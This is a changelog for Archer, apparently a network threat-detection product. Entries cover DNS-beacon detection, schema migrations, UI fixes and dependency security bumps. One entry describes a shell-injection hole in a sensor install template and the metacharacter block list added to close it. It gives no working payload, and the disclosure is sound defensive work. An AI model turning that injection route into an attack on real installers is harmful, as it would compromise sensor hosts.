# Changelog

All notable changes to Archer are recorded here. The format follows
[Keep a Changelog](https://keepachangelog.com/en/1.1.0/) plus a custom
**Detection changes** section that flags any change to score formulas,
thresholds, or finding semantics — analysts use that section to decide
whether their existing baselines need re-grounding.

## Versioning

Archer is versioned with [Semantic Versioning](https://semver.org/) under
the **0.x prefix**: pre-1.0 minor versions may break any of four surfaces
without a major bump. Once Archer reaches 1.0 those four surfaces become
the stability contract.

The four breaking-change categories:
1. **HTTP/SSE API contract** — renamed/removed fields in `/api/*`, changed
   SSE event shapes.
2. **DB schema** — table changes that require data migration on upgrade.
3. **Quiver sensor protocol** — enrollment payload, rsync layout, ports,
   `quiver.sh` schedule contract.
4. **Detection semantics** — score formulas, thresholds, finding types,
   feed-matching logic.

Any of those changing at minor-bump granularity (e.g. v0.1 → v0.2) is
expected pre-1.0. They will be called out under `### Breaking` and, where
relevant, `### Detection changes` in each release entry.

---

## [Unreleased]

## [v0.25.0] — 2026-05-17

### Breaking

- **DB schema: eight columns added to `findings` (migration 0018).**
  `ts_score`, `ds_score`, `hist_score`, `dur_score`, `mean_interval`,
  `median_interval`, `jitter` (all `REAL`) and `sample_size`
  (`INTEGER`), every one `NOT NULL DEFAULT 0`. Applied idempotently
  and transactionally on startup — no operator action — but it is a
  schema change, called out here per the pre-1.0 contract. This
  closes the deferred **NEW-89** sub-score-persistence debt: the four
  beacon sub-scores (previously in-memory only, `json:"-"`, zeroed on
  every restart and on the preserve-historical carry-forward) now
  survive both.

### Added

- **DNS Beaconing — DNS-cadence beacon detection on `(src, apex)`.**
  A regular-cadence, low-entropy, low-diversity DNS heartbeat to a
  single FQDN — the Cobalt-Strike DNS-C2 shape — slipped *both* DNS
  Tunneling (labels too short/low-entropy, diversity too low) and
  conn-level Beaconing (IP-pair keyed, never consumes DNS query
  timing; a DoH-free DNS beacon may produce no conn-level beacon at
  all). The new detector keys on `(src, apex)` (eTLD+1 via the Public
  Suffix List), reuses the conn-level timing+spectral machinery
  (Algorithm-R reservoir → statistical → multimodal → entropy →
  Lomb-Scargle rescue), and scores
  `timing·0.5 + inverse-subdomain-diversity·0.25 + window-coverage·0.25`.
  A new `DNS Beaconing` finding type, contributing to Host Risk Score
  (weight 30) and Correlated Activity. New **DNS Beacon Min Queries**
  Settings knob (`dns_beacon_min_queries`, default 20) — a
  sample-size floor analogous to the conn/HTTP beacon minimums. See
  `docs/DETECTION_METHODS.md` §9.6.
- **Structured beacon triage header.** Opening a Beaconing / HTTP
  Beaconing finding now shows jitter %, "every 47s ± 3s", median
  interval, and sample size in the first line of the detail pane,
  plus the per-axis sub-score breakdown — surfaced from data the
  analyzer already computed but buried in a pipe-delimited string.
  The four sub-scores and the timing-summary fields are now
  serialized on the findings JSON API and persisted (migration
  0018).
- **Per-host beacon density.** The Hosts tab gains a sortable
  **Beacons** column — the count of Beaconing / HTTP Beaconing
  findings per host — so a staging host that accounts for many of
  the active beacons stands out instead of being buried in a flat
  list.
- **Allowlist modal Relationships tab.** The pair allowlist is now
  managed inside the Allowlist modal under a **Relationships** tab
  (entries textarea and relationship rules are sibling tabs) instead
  of a separate sidebar dialog.
- **Source Records — right-click "Copy cell".** Native double-click
  selection truncates on punctuation (a Community ID's `:`/`=`), so
  analysts could not grab a full cell value. A right-click
  Copy-cell context menu on data cells copies the exact value.

### Changed

- **Pair allowlist renamed in the UI: "pair" → "Relationship", and
  "permanent" phrasing dropped.** Semantics are unchanged — it is
  still the same pure, tuple-scoped `(src, dst, port[, finding_type])`
  view filter with no expiry. The right-click menu item is now
  **Allow this Relationship**; the standalone Pair Allowlist sidebar
  dialog was removed in favour of the Relationships tab.

### Detection changes

- **New `DNS Beaconing` finding type.**
  `score = clamp(100·(ts·0.5 + inv_diversity·0.25 + coverage·0.25), 1, 100)`;
  CRITICAL ≥ 80 else HIGH. The timing axis is the exact conn-level
  pipeline and reuses the global spectral knobs (no DNS-beacon-specific
  scoring knobs). Two scoping rules keep it from double-counting other
  detectors' evidence: a **diversity gate** (an apex at or above
  `dns_unique_subdomain_min` is exfil-shaped — DNS Tunneling owns it,
  Correlated Activity links the two) and **NXDOMAIN exclusion**
  (NXDOMAIN-dominated streams are the DNS NXDOMAIN Flood detector's
  finding; resolver-retry timing would also contaminate the cadence).
  The built-in CDN/cloud allowlist (shared with the DGA augmentation)
  plus the operator's curated allowlist suppress benign apexes before
  scoring. **Existing golden fixtures are unchanged — the detector
  adds no findings to any prior scenario.** Operators: re-baseline if
  you run regular-cadence DNS to internal or low-diversity
  infrastructure that is not on an allowlist.
- **Beacon sub-scores (ts/ds/hist/dur) are now persisted and
  API-exposed.** No formula change: Beaconing and HTTP Beaconing
  scores, severities, and finding identity are byte-for-byte
  identical — the sub-scores are merely newly visible and durable.

## [v0.24.0] — 2026-05-16

### Breaking

- **DB schema: `pair_allowlist` table added (migration 0017).** New
  table `pair_allowlist(id, src, dst, port, finding_type, detail,
  created_by, created_at)` with a unique index on the
  `(src, dst, port, finding_type)` tuple. Created idempotently and
  transactionally on startup — no operator action — but it is a schema
  change, called out here per the pre-1.0 contract.

### Added

- **Pair allowlist — tuple-scoped permanent finding filter.** The flat
  IP allowlist is too blunt for the canonical beacon false-positive: an
  internal host on a regular interval to known infrastructure (DNS /
  NTP / AD). Allowlisting the server IP blinds you to real C2 to it;
  allowlisting the source host blinds you to its other beacons. A pair
  rule scopes the exclusion to one `(src, dst, port)` tuple, optionally
  narrowed to a single finding type — so muting `Beaconing` on a
  known-good DNS pair leaves `DNS Tunneling` on that same pair live
  (real tradecraft to a legitimate resolver still surfaces). An empty
  finding-type is the deliberate broaden that hides every type on the
  tuple. Right-click a finding → **Allow this pair permanently**
  (pre-filled, scope defaults to that finding's own type); manage and
  remove rules from the **Pair Allowlist** sidebar dialog.

  It is a **pure view filter**, mirroring IP-allowlist semantics:
  consulted only in the findings filter and the bell-suppression path,
  never at finding-emit time. Findings are never dropped from the
  store, so adding a rule hides matching rows on the next
  `/api/findings` fetch and removing it brings them back immediately
  with no re-analysis. New endpoints: `GET` / `POST`
  `/api/pair-allowlist` and `DELETE /api/pair-allowlist/{id}` (write
  roles for mutations, same gating as suppressions). Audit vocabulary
  gained `pair_allowlist_add` / `pair_allowlist_remove` (tuple / id
  only, no finding data).

## [v0.23.0] — 2026-05-16

### Added

- **Self-service password change.** Any logged-in user can rotate their
  own password from the new account menu (click your name in the top
  bar → Change password). `POST /api/me/password` takes
  `current_password` / `new_password` / `confirm`; the current password
  is re-verified through the same timing-pad-equalised `Authenticate`
  path `/login` uses, so a hijacked session that can't prove knowledge
  of the credential can't silently rotate it. On success every session
  for that user is dropped (killing any other live session) and a fresh
  cookie is minted so the actor stays logged in where they made the
  change. Minimum length 8, matching registration.
- **Admin password reset.** Admins get a per-row **Reset PW** action in
  the Users modal. `PATCH /api/users/{id}` now accepts an optional
  `password` field (additive — `role` / `status` behaviour unchanged);
  no target-current-password is required since the admin is the
  authority, self-reset via this path is refused (use self-service),
  and the target's sessions are dropped so they re-authenticate on the
  new credential — the same session-invalidation discipline the
  role/status/delete paths use. The Users dialog widened to 1080px so
  Approve + Reset PW + Delete stay on one row.
- Audit vocabulary gained `user_password_change` (self) and
  `user_password_reset` (admin). No password material is written to any
  audit field (before/after/details are empty for both).

## [v0.22.0] — 2026-05-16

### Breaking

- **DB schema: `feeds.last_pruned_count` added (migration 0016).** Records
  how many indicators the most recent full refresh aged out. Additive
  column, `DEFAULT 0`, applied transactionally on startup — no operator
  action — but it is a schema change, so it is called out here per the
  pre-1.0 contract. Refresh-owned per the NEW-22 ownership model: written
  only by the prune step via the new targeted `SetFeedPrunedCount`, never
  by an admin feed edit (so a config change can't reset the stat).

### Added

- **Backup / restore tooling.** `./backup.sh` authenticates as an admin
  and drives `GET /api/admin/backup` (the `VACUUM INTO` snapshot — the
  only consistent online path, since the container ships no `sqlite3`),
  writes a timestamped `archer-backup-*.db`, verifies its SQLite magic
  before keeping it, and optionally prunes old snapshots (`BACKUP_RETAIN`)
  and replicates off-box (`BACKUP_RSYNC_DEST` / `BACKUP_RSYNC_SSH`).
  `./restore.sh <snapshot>` validates the file, confirms, stops the
  container, swaps it into the `archer-data` volume (clearing stale
  WAL/SHM, leaving `/data/tls/` and the other volumes untouched so sensor
  pinning survives an in-place restore), and restarts.
- **Feed indicator-aging visibility.** The Feeds dialog shows a per-feed
  `X% aged` line under the aging-days knob — the share of the pre-prune
  population the last full refresh removed (hover for absolute counts) —
  so the per-feed `indicator_aging_days` window is calibratable instead
  of blind. Exposed on `GET /api/feeds` as `last_pruned_count`; the
  pre-prune total is `last_pruned_count + last_indicator_count`. The line
  is gated on aging enabled and a full refresh having run (the count is
  stale after an incremental or with aging off).

### Changed

- **Time range is no longer reset by Reset filter.** The time-range
  selection is the analyst's working scope, not a filter predicate — it
  now persists across a Reset, which still clears search / src / dst /
  port / severity / type / sensor / score / spectral-only but leaves the
  window as the analyst set it.
- **Bell Jump also clears the spectral-only filter.** Jump neutralises
  every predicate `/api/findings` can emit so the target finding is
  always shown and highlighted. The spectral-only checkbox was the one
  predicate it missed: a Jump to a non-spectral finding while "spectral
  only" was checked silently fell back to "hidden from table view"
  instead of scrolling to the row.

### Fixed

- **Broken `sqlite3`-in-container backup / restore / verify docs.**
  OPERATIONS.md and QUICKSTART_OPS.md told operators to run
  `docker compose exec archer sqlite3 …` for backups and schema-version
  checks, but the image has no `sqlite3` (pure-Go, no-CGO). The
  Backup-and-restore section was rewritten around the new scripts, the
  non-functional commands removed, and the schema-version check now reads
  the startup migration log / `/api/version`. (The audit-log IR-query
  examples still carry the same broken pattern — tracked for a separate
  pass.)

## [v0.21.0] — 2026-05-14

### Breaking

- **TI Hit multiplicity changed.** When a single destination is flagged by
  multiple TI sources (e.g. MISP indicator overlap with FeodoTracker or
  AbuseIPDB), the analyzer now emits **one** `TI Hit (IP)` /
  `TI Hit (Domain)` finding per `(src, dst, port)` tuple regardless of
  how many sources matched. Pre-fix, the inner emit loop produced one
  finding per `(dst, source)` pair × one per contacting src, so a dst
  flagged by N sources with M sources contacting it produced N×M findings
  with identical `Fingerprint(Type, SrcIP, DstIP, DstPort)`. The merged
  finding keeps the highest score and most severe severity across
  sources; the Detail line lists every matching source's evidence with
  `" | "` separators; SourceFile joins source labels with `" + "`.
  Dashboards and exports counting raw TI Hit rows will see a drop in
  cardinality; per-host TI signal is unchanged.

### Detection changes

- TI Hit per-source-fan-out collapsed to one finding per `(src, dst,
  port)`. The bell-eligibility band, severity ranges, and per-host risk
  weights are unchanged — this is purely a row-multiplicity fix.

### Fixed

- **`saveFindings` UNIQUE-constraint rollback that silently dropped
  every full Analyze.** The multi-source TI Hit emit produced in-batch
  duplicate fingerprints; `SetFindings`'s carry-forward branch returned
  the same `old.ID` for all duplicates; the second `INSERT` collided
  on the primary key, rolling back the entire transaction. The
  in-memory `s.findings` was updated before the save (so the UI showed
  CAs / HRS until restart), but disk stayed frozen — visible as
  "rollups disappear after rebuild." `SetFindings` now does a
  defensive in-batch fingerprint dedup before the ID-assignment loop
  (highest-scored row wins, first-seen order preserved) as a safety
  net so any detector that emits duplicates can no longer take down
  the pipeline.
- **Correlated Activity + Host Risk Score lost across TI-only
  incremental watch ticks.** `SetFindings`'s `IsRollupType` purge fired
  on every call, including the 5 incremental ticks between UTC-midnight
  full passes. Since incrementals don't run `correlateFindings()` or
  `aggregateRisk()`, the purge dropped every rollup the next-most-
  recent full pass had emitted. Split into `SetFindings` (full-pass:
  purges stale rollups) and `SetFindingsIncremental` (incremental:
  preserves rollups untouched). The watch loop's incremental path and
  the archive-scan path now call `SetFindingsIncremental`.
- **HTTP-derived TI Hits emitted with empty Sensor.** Two `ti.go` emit
  sites for URLhaus and feed-domain matches don't track `SourceFile`,
  so `sensorOf` returned `""` and findings persisted unattributed.
  `watch.go`'s incremental path and `handlers_api.go`'s archive scan
  now call `Analyzer.SetDefaultSensor` before `AnalyzeTIOnly`, so
  SourceFile-less emits fall through to the deployment's default
  sensor for single-sensor installs.
- **Modal dialogs squashed in macOS Safari.** Nested
  `table-layout: fixed` inside a flex `.dlg-body` with the default
  `flex: 1` (which expands to `flex: 1 1 0%`) inherited the table's
  min-content size and either over- or under-sized the dialog. The
  fix gives `.dlg-body` `flex: 1 1 auto; min-height: 0; min-width: 0`
  — the canonical Safari fix releasing the flex item from min-content
  sizing so its own `overflow: auto` wins.
- **Row-kebab menus rendered in the wrong spot once made visible.**
  Dialog centring used `transform: translate(-50%, -50%)`, which made
  the dialog a containing block for `position: fixed` descendants.
  Row menus computed viewport coords from `getBoundingClientRect()`
  and applied them as `position: fixed`, expecting viewport
  positioning. Switched centring to `inset: 0; margin: auto` — same
  visual result, but no transform on the dialog and the viewport
  stays the containing block for the menu.

### Added

- **Right-click "Show contributing activity" on Correlated Activity
  rows.** Filters the Findings tab on the CA's `(src, dst)` pair via
  the existing search form (`filter-src` + `filter-dst`). Visible only
  on CA rows. Shows the CA itself, its contributors, and any newer
  activity on the same pair — not limited to the exact contributor IDs
  the CA was emitted with, so dismissed contributors stay visible and
  new findings on the same pair surface naturally.
- **Heartbeat pulse dot during Source Records scan.** Reuses the
  `.pulse-dot` class from the sensor-enrollment "awaiting join"
  indicator. Renders left of the "Scanning logs…" status line so
  analysts see live feedback that the scan is in progress.
- **Drag for the Score Evolution expanded chart modal.** Its custom
  header now carries `.dlg-drag-handle`, which `dialog.js` honours
  alongside `.dlg-header`. Brings drag parity with every other dialog.

### Changed

- **Hosts-tab right-click context menu.** "Lookup …" hidden — Hosts
  rows always show internal RFC1918 IPs (built from the operator's
  org-CIDR set), so VT/Shodan/AbuseIPDB lookups have nothing to
  contribute. "Pivot to …" now switches to the Findings tab and
  filters on that IP rather than opening the IP in a graph view.
- **Dialog system overhaul.**
  - Corner resize removed across all dialogs. Drag-by-header preserved
    for moving a dialog out of the way; declared widths win.
  - Score Evolution modal: top-right `×` button replaced with a
    bottom-right `Close` button in a `.dlg-footer`, matching the
    secondary-Cancel pattern used by every other dialog.
  - Base `dialog { overflow }` switched from `hidden` to `visible`
    so row-kebab popovers can extend past the dialog edge when the
    kebab sits near it; `.dlg-header` and `.dlg-footer` got matching
    `border-radius` so the rounded corners still look clean.
- **Users modal**: widened to 960px (was 720px). Joined column now
  shows full UTC date+time (`YYYY-MM-DD HH:MM`) in monospace instead
  of just the date. Far-right Actions column right-aligned to free
  visual space for the wider Joined field.
- **Beacon Visualization modal**: 720px-wide canvas centered inside
  the 880px dialog (was left-aligned with a visible gap on the right).
- **Detail dock**: `Export TXT` button hidden when the Score Evolution
  tab is active. It covers Detail / Notes / TI Results; the Score
  Evolution tab has its own PNG/JPEG export inside the expanded chart
  modal, and showing both implied the TXT button exported the chart.

## [v0.20.2] — 2026-05-14

### Fixed

- **Duplicate Correlated Activity rows on the same (src, dst) pair.**
  The fix resolves Sensor at finding-emit time inside `Analyzer.add`
  instead of after `Analyze()` returns. Pre-fix, `watch.go` assigned
  Sensor in a post-Analyze loop — so the cross-detector correlation
  phase (which runs *inside* `Analyze` and partitions pairs on
  Sensor) saw fresh contributors with `Sensor=""` while historical
  contributors loaded from the store carried their persisted Sensor
  (`"deathstar"` in single-sensor deployments). The same `(src, dst)`
  produced two distinct pair keys, two `Correlated Activity` findings
  with identical Fingerprints (Sensor isn't part of the fingerprint),
  and `SetFindings` had no in-batch fingerprint dedup so both
  persisted as separate rows. The watch loop then squashed both to
  the same Sensor in its post-loop, producing the symptom: two
  visually-identical CA rows both flagged `IsNew=true`. Resolving
  Sensor at emit time — via the new `Analyzer.SetDefaultSensor` API
  for aggregate findings, or the existing `sensorOf(SourceFile)`
  path for per-record findings — restores the pair-key invariant
  that correlate assumes. Existing duplicates in the store collapse
  on the next full pass via the existing `IsRollupType` purge plus
  the fingerprint-merge map collision.
  - New `Analyzer.SetDefaultSensor(name)` API; `watch.go` calls it
    before `Analyze()` for single-sensor deployments so aggregate
    findings (Beaconing, Strobe, HTTP Beaconing, Off-Hours Transfer,
    Host Risk Score, Correlated Activity) carry a populated Sensor
    when correlate sees them.
  - Three new regression tests in `correlate_test.go` codify the
    invariant: exactly one Correlated Activity per `(src, dst,
    sensor)` triple, SourceFile-driven sensor resolution wins for
    per-record detectors, and caller-set Sensor (correlate's own
    `Sensor: key.sensor`) is preserved against both resolution
    paths.

## [v0.20.1] — 2026-05-13

### Security

- **Go toolchain bumped from 1.25.0 to 1.25.10** in `go.mod`; Dockerfile
  builder image pinned to `golang:1.25.10-alpine` so what the container
  actually runs matches what the module declares (the floating `1.25`
  tag would have drifted silently with each Alpine refresh). Closes the
  bulk of OSV-scanner stdlib findings against 1.25.0 — TLS, HTTP/2,
  `html/template`, `crypto/x509`, `net/url` patches landed across
  1.25.1 → 1.25.10. Full test suite, including the 42 detection golden
  scenarios, passes under the new toolchain unchanged.
- **`golang.org/x/net` bumped from 0.50.0 to 0.54.0.** Closes
  GO-2026-4559 (HTTP/2 server panic on crafted frames) and GO-2026-4918
  (HTTP/2 infinite loop on bad `SETTINGS_MAX_FRAME_SIZE`). Archer only
  imports `golang.org/x/net/publicsuffix` directly; the vulnerable
  HTTP/2 paths reach us transitively through stdlib `net/http`'s
  default HTTP/2 negotiation on the TLS listener.
- **Quiver install-template host validation.** The `/quiver/install.sh`
  handler substitutes `{{ARCHER_HOST}}` into a shell double-quoted
  assignment via `strings.NewReplacer`, which doesn't quote. A host
  value carrying `"`, `` ` ``, `;`, `$`, or a redirect/pipe metachar
  could close the quote and execute arbitrary shell when the sensor
  admin ran the install one-liner. Realistic exploitation is narrow —
  the admin-set `SensorFacingHost` override is admin-gated and the
  `r.Host` fallback would need a privileged proxy/MITM with a valid
  cert — but the defense is a one-line `strings.ContainsAny` check
  before substitution. Legitimate hosts (FQDNs, IPv4, bracketed IPv6)
  pass trivially. Already-enrolled sensors are unaffected: install.sh
  is only fetched at initial enrollment, never re-fetched on checkin
  or rsync.

## [v0.19.0] — 2026-05-12

### Added

- **Per-row kebab (⋮) menu in the Feeds and Sensors modals.** Row
  actions (Refresh / Edit / Delete on Feeds; Reassign slot / Disenroll
  / Purge data on Sensors; Revoke on tokens; Enroll-this / Dismiss on
  unauthorized attempts) now live behind a single compact ⋮ control
  per row instead of a stack of inline buttons. Frees ~200px of column
  width that previously held three-button action columns, and the
  Action affordance no longer scrolls off-screen on narrow dialogs.
  New shared module: `web/static/js/rowmenu.js`. Menu appends inside
  the open `<dialog>` so the top-layer stacking context contains it;
  closes on outside-click, ESC, scroll, or resize.
- **"Show enrollment command" item on fresh pending tokens.** Admins
  can replay a token's curl one-liner without revoking-and-regenerating
  when the sensor operator asks for the install command again. Reopens
  the enroll dialog in show-mode (header swaps to "Sensor Enrollment
  Command", override input + Generate button hidden, one-liner
  pre-filled with Copy ready) and shows the same blue pulse-dot
  "Waiting for sensor to run the install command…" line that the
  fresh-generate flow uses. The existing `sensor_enrolled` SSE
  handler swaps it to the green ✓ "Enrolled as `<name>`" confirmation
  when the sensor checks in. Expired tokens only offer Revoke.

### Changed

- **Sensors modal switches to `table-layout: fixed` with declared
  column widths across all three sub-tables.** Columns honor their
  declared sizes rather than stretching proportionally as the dialog
  resizes; the rightmost kebab cell absorbs the leftover so all three
  tables stack uniformly at 1250px (the natural width of the Enrolled
  Sensors table).
- **Sensors modal default-opens at 1250px** instead of 95vw so every
  column is visible without the operator dragging the resize handle.
  Matches the Feeds modal pattern. Drag-resize still works to widen
  for whitespace or narrow to squish columns.
- **All timestamps in the Sensors modal render as UTC `YYYY-MM-DD
  HH:MM`** (full `YYYY-MM-DD HH:MM:SS UTC` in the hover title),
  matching the Feeds modal. Replaces the previous mix of full-ISO +
  analyst-configured-timezone rendering for Last seen; the watch-config
  timezone is no longer consulted by the Sensors modal. Operators who
  relied on local-time rendering can read the epoch from
  `/api/sensors` and format client-side.
- **Feeds modal column widths re-tuned**: Name 110 → 220, Source 90 →
  100, Status 100 → 130, Indicators 110 → 130, Last refresh 130 → 150,
  Aging 60 → 80. Total stays 1000px so the dialog still default-opens
  at the table's natural width.
- **Feeds modal uses `table-layout: fixed`** so drag-resize of the
  dialog adds whitespace around the table instead of stretching
  columns. Row controls stay at the same screen position regardless
  of dialog size.
- **Right-aligned kebab pinned to the rightmost column of every
  Sensors sub-table.** The kebab sits flush against the table's right
  edge for a uniform action-anchor placement.
- **Manual feed-refresh hard-cap raised from 5 → 10 minutes.** Slow
  MISP/OpenCTI servers fetching large attribute sets routinely exceed
  5 minutes on full pulls; the 10-minute cap is the new ceiling
  before the request returns `context deadline exceeded`. The
  type-shard parallelism and 1000-row PageSize still keep typical
  fetches under that.

### Fixed

- **Feed-refresh fetch no longer killable by a browser disconnect.**
  The handler used to root its 5-minute timeout in `r.Context()` so
  closing the Feeds dialog (or any intervening proxy timing out the
  long-lived POST) canceled the in-flight MISP/OpenCTI fetch and left
  the feed row stuck on `status=fetching` until the next watch tick.
  Now rooted in `context.Background()` with the 10-minute cap; the
  goroutine runs to completion regardless of whether the operator is
  still watching. Closing the modal during a long refresh no longer
  aborts the sync.

## [v0.18.10] — 2026-05-12

### Fixed

- **Feeds modal action buttons fit on screen at typical viewport
  widths.** The min-width floors set in v0.18.6 reserved more
  horizontal space than realistic content used, pushing the
  action column off the right edge of the dialog. Retuned every
  floor to just-enough-for-content with a small margin
  (validated against actual rendered widths) and shortened the
  Last refresh timestamp from `YYYY-MM-DD HH:MM:SS UTC` to
  `YYYY-MM-DD HH:MM` (full form on hover via the cell tooltip).
  Indicators column still has room for 8-digit + commas
  (`12,345,678`). Floor sum dropped from 960px to 790px — table
  now fits in a ~950px viewport with margin.

## [v0.18.9] — 2026-05-12

### Fixed

- **Feeds modal Delete button stays visible.** After v0.18.8
  left-aligned the action buttons, Delete was still getting
  clipped on narrower screens because the sum of column
  min-widths was eating the dialog's visible width. Trimmed
  the floors on every column with slack (Name, Source, Status,
  Indicators, Last refresh, especially Aging which only needs
  ~50px for "30 d") and bumped the action column to 280px so
  Refresh / Edit / Delete sit on one line with breathing room
  from the dialog's right edge. Net floor dropped from ~1060px
  to ~960px.

## [v0.18.8] — 2026-05-12

### Fixed

- **Feeds modal action buttons are now left-aligned in their
  cell.** The Refresh / Edit / Delete cluster was inline-styled
  `text-align:right`, which pushed the rightmost button off the
  visible dialog width when the column grew. Dropping the
  alignment makes the buttons sit at the left edge of the cell,
  visible at the start of the column regardless of how wide it
  expanded.

## [v0.18.7] — 2026-05-12

### Fixed

- **Indicators column in the Feeds modal is now left-aligned.**
  Was inline-styled `text-align:right`, which read oddly against
  the rest of the left-aligned table and pushed the truncated
  badge to the opposite side of the cell from the number.
- **Action columns in the Feeds and Sensors modals get an
  explicit min-width.** When other columns expanded to fit long
  content (wide feed name, full "fetching · 47k indicators · 12s"
  status), the trailing action column collapsed and the
  rightmost button (Delete on Feeds, Purge on Sensors) got
  clipped. min-width: 260px on Feeds and 200px on Sensors gives
  the row's admin buttons a guaranteed floor regardless of how
  much room the other columns claim.

## [v0.18.6] — 2026-05-12

### Changed

- **Feeds + Sensors modal columns expand to fit content.** Pre-fix
  the Feeds modal truncated Status ("fetching · 47k indicators …")
  and Indicators (7-digit counts cut to "1,234,5…") because the
  columns had fixed `width:` values plus `overflow:hidden;
  text-overflow:ellipsis` on the cells. The Sensors modal had no
  specific table CSS and relied on browser defaults that wrapped
  long hostnames onto two lines. Both modals now match the Audit
  Log dialog: `min-width` on `<th>`s (a floor, not a cap), no
  cell truncation, and the dialog floats to `95vw` (capped at
  `1500px`) instead of `1100px`. Long status strings and large
  indicator counts surface in full.

## [v0.18.5] — 2026-05-12

Operator-pulled. The NEW-18 SSRF guard from the audit arc refused
every feed URL targeting RFC1918 / loopback / link-local / IPv6 ULA
space — right for the cloud-metadata / hostile-admin threat model
the audit was written against, wrong for the common real-world
deployment where the operator legitimately runs an internal MISP or
OpenCTI on the same internal network as Archer. Real reports from
dogfooding: a feed at `https://10.10.40.17/` returned
`url host 10.10.40.17 is an internal address; refused to prevent
SSRF`.

The fix adds a per-feed `allow_internal` opt-out, mirroring the
existing `tls_skip_verify` shape. Both bypasses are per-feed,
default-off, audit-logged. Per-feed scope means a typo in another
feed's URL still gets refused — the audit-arc contract holds for
every feed unless explicitly opted in.

### Added

- **Per-feed `allow_internal` flag.** A new "Allow internal
  address (skip SSRF guard for this feed)" checkbox in the feed
  edit dialog. When ticked, the feed's URL can target RFC1918 /
  loopback / link-local / IPv6 ULA space and the fetch-time
  CheckRedirect lets internal-address hops follow through. Per-feed
  scope: ticking it on the internal MISP at `10.10.40.17` doesn't
  weaken any other feed's SSRF guard. Default off. Captured in
  `feed_create` / `feed_update` audit-log entries (`allow_internal`
  appears in the before/after maps) so a later reviewer can prove
  who opted which feed in.

### Schema

- **Migration 0015 — `feeds.allow_internal`.** `ALTER TABLE feeds
  ADD COLUMN allow_internal INTEGER NOT NULL DEFAULT 0`. Existing
  feeds default to 0 (deny) — no behavior change for any feed not
  explicitly opted in.

### API

- `POST /api/feeds` and `PUT /api/feeds/{id}` now accept an
  `allow_internal` boolean field in the request body. Default
  `false`. `GET /api/feeds` returns the field on each feed row.

### Tests

- `TestValidateFeedRequest_AllowInternalBypass` articulates the
  invariant rather than the failure case: an internal URL is
  rejected when `AllowInternal=false` and accepted when
  `AllowInternal=true`, while other validation (scheme, name,
  api_key on create, aging-days) still applies regardless of the
  flag. The existing `TestRejectInternalFeedURL_LiteralIPs`
  (NEW-18 contract) is unchanged — `rejectInternalFeedURL` itself
  still refuses internal literals; the gating happens one level
  up at `validateFeedRequest`.

## [v0.18.4] — 2026-05-12

### Changed

- **Score Evolution promoted to its own dock tab.** The 30-day
  beacon score evolution chart used to live at the bottom of the
  Detail tab panel; analysts scrolled past the textual summary to
  reach it. Now sits as a peer tab next to TI Results, only
  visible when the selected finding is `Beaconing` or
  `HTTP Beaconing` (the two types that carry `beacon_history`
  rows). For every other finding type the tab button hides
  entirely so the tab strip stays honest. Keyboard shortcut `4`
  flips to Score Evolution. When an analyst switches from a
  beacon finding to a non-beacon one while Score Evolution is
  active, the dock snaps back to Detail so the visible active
  state matches the visible tab strip.

## [v0.18.3] — 2026-05-12

### Changed

- **Dismissed sub-tabs moved below the main tab strip.** The
  Findings / Campaigns sub-tabs that appear when the Dismissed
  top-level tab is active used to sit above the main tab row,
  which inverted the visual hierarchy. Now the layout reads
  top-down: pick Dismissed up top, sub-tabs reveal directly under
  it to pick Findings vs Campaigns within that bucket. Same
  elements and CSS — just an HTML reorder.

## [v0.18.2] — 2026-05-12

Two small operator-pulled changes. The DB backup button closes a
"what if I want to reference this state later" gap that hadn't had
a first-class affordance — previously the operator had to shell
into the container and copy `/data/archer.db` by hand, with the WAL
gotcha that the file alone misses unflushed data. The context-menu
arrow color was a visibility complaint from dogfooding.

### Added

- **Admin DB backup.** Settings → Backup → Download DB backup
  streams a consistent VACUUM INTO snapshot of the live SQLite
  database. Admin-only via the existing role gate on the Settings
  button. Filename is timestamped (UTC). The download covers
  findings, notes, audit log, sensor enrollments, allowlist / IOC /
  suppressions, and users — restoring means stopping Archer and
  replacing `/data/archer.db`. Audit-logged as `db_backup` with
  size and filename, so an exfil-via-backup attempt leaves a row.

### Changed

- **Context-menu click-anchor arrow brightened.** The right-click
  menu's anchor glyph — the small arrow that points back at the
  click point — was `var(--accent)` (blue) at 16px, hard to spot
  against the dark menu chrome. Now `#ff2d2d` at 18px with
  `font-weight: 700` so the operator can find it without hunting.

## [v0.18.1] — 2026-05-12

Operator-pulled dock-UX refinements stacked on top of v0.18.0, plus
NEW-111 (twenty-fourth external review round, first post-v0.18.0)
closing a bell-jump silent-no-op that surfaced in dogfooding.

The dock pane work shipped together because each piece tightened
the same workflow: drag the dock to whatever height the analyst
wants, keep the action footer reachable from any view, scroll the
body only when needed, let the detail text fill the room it has,
and move Export TXT to the tab strip so it's reachable from every
tab (and let it cover Detail + TI + Notes instead of just Notes).

NEW-111 is the same shape as the bell-jump fix that landed earlier
in the audit arc: a UI button that relies on cached state silently
fails when state shifts. The earlier fix used a position-aware load
to escape pagination drift; NEW-111 covers the filter-side case
(finding whose src/dst was allowlisted or suppressed *after* the
bell rang). filterFindings excludes the row from every listing
endpoint, the position lookup 404s, Table.jumpTo silently returns,
and the Jump click reads as a no-op. Three coordinated changes
prevent both new and existing instances:

- SetFindings's bell-emit gate consults the allowlist and
  suppressions, mirroring filterFindings.
- SetAllowlist and AddSuppression run a cleanup pass that
  dismisses already-emitted finding notifications whose src/dst is
  now hidden.
- The bell-jump JS surfaces a clear status message when the
  position endpoint reports the row is filtered out — Detail still
  renders in the dock so the analyst can act via the footer.

### Added

- **Drag-to-resize on the detail dock.** Grab the top edge of the
  pane and pull. Clamps to [120px, 80% viewport], re-clamps on
  window resize. Height persists to localStorage so it survives
  reloads, mirroring the collapse preference. Auto-expand on row
  click no longer overwrites the persisted collapse state.
- **Persistent action footer.** Acknowledge / Escalate / Dismiss /
  Beacon Chart / PCAP Filter / Source Records / Suppress remain
  visible when the dock is collapsed. Analysts can take workflow
  actions on the selected finding from every view, including the
  minimized state.
- **Tab-inline Export TXT.** Moved from inside the Notes panel
  into the dock-tab strip (right-aligned). Reachable from every
  tab. Disabled when no finding is selected, matching the other
  action buttons. The redundant "Analyst Notes" section header in
  the Notes panel is gone — symmetric with the TI Results panel.
- **Export TXT covers Detail + TI Results + Analyst Notes.**
  Previously notes-only. The file now opens with the header block,
  then DETAIL (the detector's emitted body), TI RESULTS (notes
  authored "TI Enrichment"), and ANALYST NOTES (everything else).
  Each section gets a placeholder when empty so the structure is
  consistent across findings. Filename dropped the `-notes` suffix:
  `archer-finding-{id}.txt`.

### Changed

- **Dock body scrolls only when needed.** The active dock-tab-panel
